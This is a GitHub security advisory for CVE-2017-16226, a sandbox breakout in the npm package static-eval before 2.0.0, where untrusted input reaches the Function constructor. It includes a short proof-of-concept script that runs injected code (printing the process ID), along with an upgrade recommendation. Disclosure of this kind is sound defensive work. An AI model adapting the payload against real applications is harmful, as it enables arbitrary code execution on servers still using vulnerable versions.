# [M] Sandbox Breakout / Arbitrary Code Execution in static-eval

## Summary
Severity: Medium
Advisory: GHSA-5mjw-6jrh-hvfq
CVE: CVE-2017-16226
CWE: CWE-20
Ecosystem: npm
Published: 2018-08-06
Source: https://github.com/advisories/GHSA-5mjw-6jrh-hvfq
Type: github-advisory

## Affected
- npm: `static-eval` — affected >=0 <2.0.0

## Details
Affected versions of `static-eval` pass untrusted user input directly to the global function constructor, resulting in an arbitrary code execution vulnerability when user input is parsed via the package.

## Proof of concept
```js
var evaluate = require('static-eval');
var parse = require('esprima').parse;
var src = '(function(){console.log(process.pid)})()';
var ast = parse(src).body[0].expression;
var res = evaluate(ast, {});
// Will print the process id
```


## Recommendation

Update to version 2.0.0 or later.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2017-16226
- https://github.com/substack/static-eval/pull/18
- https://github.com/advisories/GHSA-5mjw-6jrh-hvfq
- https://maustin.net/articles/2017-10/static_eval
- https://www.npmjs.com/advisories/548
